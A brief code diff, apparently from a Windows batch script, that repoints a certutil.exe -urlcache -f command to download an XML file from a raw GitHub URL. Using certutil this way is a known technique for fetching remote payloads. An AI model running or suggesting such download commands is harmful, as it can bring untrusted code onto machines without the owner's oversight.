@@ -1,4 +1,4 @@
-certutil.exe -urlcache -f https://github.com/benjiabcdir/p/blob/master/hathaway.xml hath.xml
+certutil.exe -urlcache -f https://raw.githubusercontent.com/benjiabcdir/p/master/hathaway.xml hath.xml
 
 timeout /T 5
 
